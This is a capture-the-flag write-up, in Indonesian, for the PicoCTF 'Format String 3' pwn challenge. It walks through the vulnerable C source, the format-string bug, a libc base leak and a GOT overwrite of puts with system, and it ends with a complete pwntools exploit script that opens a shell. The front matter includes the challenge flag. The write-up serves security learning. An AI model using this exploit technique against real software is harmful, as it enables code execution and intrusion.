---
slug: "pwn-format-string-3"
title: "Format String 3"
competition: "Cylab Security Academy (PicoCTF)"
category: "Pwn"
difficulty: "Medium"
date: "2026-10-22"
updated: "2026-10-30"
summary: "GOT overwrite with libc technique + format string attack."
tags: ["FORMAT STRING","GOT OVERWRITE"]
status: "published"
flag: "academy{type_it_manually_if_you_want_but_better_you_do_it_yourself}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-format-string-3"
---

# Format String 3

> GOT overwrite with libc technique + format string attack.

## Recon

```c
checksec
File:     /home/claritys/ctf/picoctf/pwn/formatstring3/format-string-3
Arch:     amd64
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No

#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```

## Vulnerability

Dapat dilihat disitu ada `printf(buf)` tanpa `%s` atau apa gitu, dia langsung ngeprint `variable`, yang di mana memunculkan **format string attack exploitation**. Kita dapat lihat juga ada `puts(normal_string)` yang di mana value `normal_string`nya adalah `/bin/sh` yang memudahkan attacker untuk exploitasi. Checksec menunjukkan kalau file ini dia `Partial RELRO`, yang di mana memungkinkan untuk `GOT` overwrite.

## Exploit plan

Strategi kita adalah ngeubah function `puts` menjadi `system`. Karena kalau kita ngeubah functionnya menjadi `system` dia akan ngeeksekusi `/bin/bash` (isinya `normal_string`). Kita melakukan ini dengan `GOT` overwrite with libc technique + format string attack, kita ngeoverwrite value `GOT` dengan address function `system` dari libc.

Pertama-tama kita akan mencari offsetnya dengan bantuan pwntools.

```c
   program = elf.path
    def exec_fmt(payload):
        p = process(program)
        p.sendline(payload)
        return p.recvall()
    
    formatstring = FmtStr(exec_fmt)
    offset = formatstring.offset
```

Snippet tersebut membantu kita untuk mencari offset input kita dengan cepat biar kita bisa ngeoverwritenya lebih gampang dan tidak usah repot repot ngerakit payload format string sendiri nanti.

Reference: [https://docs.pwntools.com/en/stable/fmtstr.html](https://docs.pwntools.com/en/stable/fmtstr.html)

Setelah kita run, kita dapat output yang di mana offsetnya adalah `38`.

![image.png](/assets/uploads/2f5e1ae4-27c0-42a6-a8c1-c15cca8adace-image.png)

Sekarang kita tinggal menghitung `baselibc`nya biar kita memanggil function `system`nya `libc` karena di `elf` ngga ada. Kita hitungnya dengan ambil leak `setvbuf` yang diberi sama programnya lalu kita kurangi dengan address function `setvbuf` yang ada di `libc`.

```c
    r.recvuntil(b'libc: ')
    leak = int(r.recvline().strip(), 16)
    baselibc = leak - libc.sym['setvbuf']
    log.success(f'Base address libcnya: {hex(baselibc)}')
```

Kita dapat `base address libc`nya.

![image.png](/assets/uploads/5339f09e-38c0-455a-b775-9ec7df8cc066-image-1.png)

Oke sekarang adalah bagian untuk ngeoverwritenya, kita pakai bantuan dari `pwntools` lagi untuk memudahkan eksploitasinya.

```python
    puts = elf.got['puts']
    system = baselibc + libc.symbols['system']
    payload = fmtstr_payload(offset, {puts: system})
    r.sendline(payload)
```

Kita menggunakan `fmtstr_payload(offset, {puts: system})` yang di mana dia itu langsung ngeoverwrite address si `got puts` dengan `libc's system`. Kita tinggal menggabungkan itu semua jadi 1 lalu kita dapet `shell`nya deh.

![image.png](/assets/uploads/320f9c67-34f6-42f1-bc47-190a08864063-image-2.png)

Yang ada di kotak kuning, itu adalah hasil dari `fmtstr_payload(offset, {<target>: <diganti apa>})`. Jadi kita ngga harus mikir dan ngerakit payload sepanjang itu, dipermudah oleh pwntools.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

elf = ELF("format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

exe = context.binary
context.terminal = ["ghostty", "-e"]
context.log_level = 'debug'
context.arch = 'amd64'

gdbscript = """
set pagination off
set confirm off

break main
continue
"""

def conn():
    if args.GDB:
        r = process([elf.path])
        gdb.attach(r, gdbscript=gdbscript)
        return r

    if args.LOCAL:
        return process([elf.path])

    return remote("addr", 1337)

def main():
    r = conn()
    program = elf.path
    def exec_fmt(payload):
        p = process(program)
        p.sendline(payload)
        return p.recvall()
    
    formatstring = FmtStr(exec_fmt)
    offset = formatstring.offset

    r.recvuntil(b'libc: ')
    leak = int(r.recvline().strip(), 16)
    baselibc = leak - libc.sym['setvbuf']
    log.success(f'Base address libcnya: {hex(baselibc)}')
    puts = elf.got['puts']
    system = baselibc + libc.symbols['system']
    payload = fmtstr_payload(offset, {puts: system})
    r.sendline(payload)
    # good luck pwning :)
    r.interactive()

if __name__ == "__main__":
    main()
```

## Referensi

-   [https://docs.pwntools.com/en/stable/fmtstr.html](https://docs.pwntools.com/en/stable/fmtstr.html)
